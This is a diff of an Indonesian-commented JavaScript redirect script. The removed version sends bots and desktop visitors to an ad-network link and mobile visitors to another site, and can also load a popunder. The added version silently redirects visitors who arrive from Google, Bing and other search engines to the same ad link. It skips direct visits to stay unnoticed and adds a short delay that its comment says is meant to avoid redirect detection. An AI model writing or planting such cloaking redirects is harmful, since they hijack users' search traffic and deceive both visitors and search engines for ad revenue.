@@ -1,167 +1,96 @@
-// ========================================
-// CONFIG
-// ========================================
-const CONFIG = {
-  popunderUrl: ' ',
-  botUrl: 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893',
-  mobileUrl: 'https://rondo.my.id',
-  desktopUrl: 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893',
-  popunderDelay: 300,
-  mobileDelay: 1000,
-  popunderTimeout: 2000,
-  openInNewWindow: true,  // true = buka tab baru, false = redirect
-  triggerOnClick: true     // true = trigger saat klik, false = auto
-};
-
-// ========================================
-// FUNGSI DETEKSI
-// ========================================
-function isBot() {
-  const ua = navigator.userAgent.toLowerCase();
-  const botKeywords = [
-    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'google', 
-    'bing', 'facebook', 'yahoo', 'curl', 'python', 'http', 'wget', 'java'
-  ];
-  return botKeywords.some(keyword => ua.includes(keyword));
-}
-
-function isMobile() {
-  return /android|iphone|ipad|ipod|opera mini|mobile/i.test(navigator.userAgent);
-}
-
-// ========================================
-// LOAD POPUNDER (with error handling)
-// ========================================
-function loadPopunder(callback) {
-  if (!CONFIG.popunderUrl || CONFIG.popunderUrl === '') {
-    console.log('Popunder disabled');
-    if (callback) callback();
-    return;
-  }
-  
-  const script = document.createElement('script');
-  script.type = 'text/javascript';
-  script.src = CONFIG.popunderUrl;
-  script.async = true;
-  
-  // Safety timeout
-  const timeout = setTimeout(() => {
-    console.warn('Popunder timeout - continuing');
-    if (callback) callback();
-  }, CONFIG.popunderTimeout);
-  
-  script.onload = function() {
-    clearTimeout(timeout);
-    console.log('Popunder loaded');
-    if (callback) {
-      setTimeout(callback, CONFIG.popunderDelay);
-    }
-  };
-  
-  script.onerror = function() {
-    clearTimeout(timeout);
-    console.warn('Popunder failed to load - continuing');
-    if (callback) callback();
-  };
-  
-  try {
-    (document.head || document.body).appendChild(script);
-  } catch(e) {
-    clearTimeout(timeout);
-    console.error('Failed to append popunder script:', e);
-    if (callback) callback();
-  }
-}
-
-// ========================================
-// REDIRECT FUNCTION
-// ========================================
-function doRedirect() {
-  const targetUrl = isMobile() ? CONFIG.mobileUrl : CONFIG.desktopUrl;
-  
-  if (CONFIG.openInNewWindow) {
-    // Buka di tab/window baru
-    console.log('Opening in new window:', targetUrl);
-    const newWindow = window.open(targetUrl, '_blank');
-    
-    // Fallback jika popup di-block
-    if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
-      console.warn('Popup blocked - trying alternative method');
-      // Alternative: buat link dan trigger click
-      const link = document.createElement('a');
-      link.href = targetUrl;
-      link.target = '_blank';
-      link.rel = 'noopener noreferrer';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-  } else {
-    // Redirect di window yang sama
-    console.log('Redirecting to:', targetUrl);
-    window.location.href = targetUrl;
-  }
-}
-
-// ========================================
-// REDIRECT LOGIC
-// ========================================
+// Script Redirect dari Search Engine
 (function() {
-  let hasTriggered = false; // Prevent multiple triggers
-  
-  // Tunggu DOM ready
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initRedirect);
-  } else {
-    initRedirect();
-  }
-  
-  function initRedirect() {
-    // Bot detection - redirect langsung
-    if (isBot()) {
-      console.log('Bot detected - redirecting to bot URL');
-      window.location.href = CONFIG.botUrl;
-      return;
+    // Daftar referer search engine utama
+    const searchEngines = [
+        'google.com',
+        'google.co.id',
+        'bing.com',
+        'yahoo.com',
+        'yandex.com',
+        'baidu.com',
+        'duckduckgo.com',
+        'ask.com',
+        'ecosia.org',
+        'search.yahoo.com',
+        'search.brave.com'
+    ];
+    
+    // URL tujuan redirect
+    const redirectUrl = 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893';
+    
+    // Fungsi untuk memeriksa apakah referer berasal dari search engine
+    function isFromSearchEngine() {
+        // Mendapatkan referer dari halaman sebelumnya
+        const referrer = document.referrer.toLowerCase();
+        
+        // Jika tidak ada referer, bukan dari search engine
+        if (!referrer) return false;
+        
+        // Periksa apakah referer mengandung domain search engine
+        for (let i = 0; i < searchEngines.length; i++) {
+            if (referrer.includes(searchEngines[i])) {
+                return true;
+            }
+        }
+        
+        return false;
     }
     
-    // Load popunder dulu
-    loadPopunder(() => {
-      if (CONFIG.triggerOnClick) {
-        // Mode: Trigger saat user klik
-        console.log('Click trigger mode enabled - waiting for user interaction');
+    // Fungsi untuk memeriksa apakah pengunjung datang secara langsung
+    function isDirectAccess() {
+        // Mendapatkan performance navigation timing
+        const perf = window.performance || window.webkitPerformance || window.msPerformance || window.mozPerformance;
         
-        // Listen untuk klik di mana saja
-        document.addEventListener('click', function handleClick(e) {
-          if (hasTriggered) return;
-          hasTriggered = true;
-          
-          console.log('Click detected - triggering redirect');
-          
-          // Remove listener setelah trigger
-          document.removeEventListener('click', handleClick);
-          
-          if (isMobile()) {
-            // Mobile: delay sebelum redirect
-            setTimeout(() => {
-              doRedirect();
-            }, CONFIG.mobileDelay);
-          } else {
-            // Desktop: langsung redirect
-            doRedirect();
-          }
-        }, { once: true }); // Auto remove after first trigger
-        
-      } else {
-        // Mode: Auto redirect (tanpa tunggu klik)
-        console.log('Auto redirect mode');
-        if (isMobile()) {
-          setTimeout(() => {
-            doRedirect();
-          }, CONFIG.mobileDelay);
-        } else {
-          doRedirect();
+        if (perf && perf.navigation) {
+            // type 0: Navigasi langsung (ketik URL, bookmark, dll)
+            // type 1: Reload
+            // type 2: Navigasi melalui history (back/forward)
+            return perf.navigation.type === 0;
         }
-      }
-    });
-  }
+        
+        // Fallback: periksa referer
+        return !document.referrer;
+    }
+    
+    // Fungsi untuk melakukan redirect
+    function performRedirect() {
+        // Simpan timestamp untuk mencegah redirect berulang
+        localStorage.setItem('redirectTimestamp', Date.now());
+        window.location.replace(redirectUrl);
+    }
+    
+    // Fungsi utama
+    function init() {
+        // Jangan redirect jika halaman diakses langsung
+        if (isDirectAccess()) {
+            console.log('Akses langsung - tidak melakukan redirect');
+            return;
+        }
+        
+        // Redirect hanya jika berasal dari search engine
+        if (isFromSearchEngine()) {
+            console.log('Berasal dari search engine - melakukan redirect');
+            
+            // Cek apakah sudah pernah di-redirect dalam 30 menit terakhir
+            const lastRedirect = localStorage.getItem('redirectTimestamp');
+            const currentTime = Date.now();
+            
+            if (lastRedirect && (currentTime - parseInt(lastRedirect)) < 30 * 60 * 1000) {
+                console.log('Redirect sudah dilakukan dalam 30 menit terakhir - skip');
+                return;
+            }
+            
+            // Delay sedikit untuk menghindari deteksi otomatis redirect
+            setTimeout(performRedirect, 100);
+        } else {
+            console.log('Bukan dari search engine - tidak melakukan redirect');
+        }
+    }
+    
+    // Jalankan script setelah halaman selesai dimuat
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
 })();
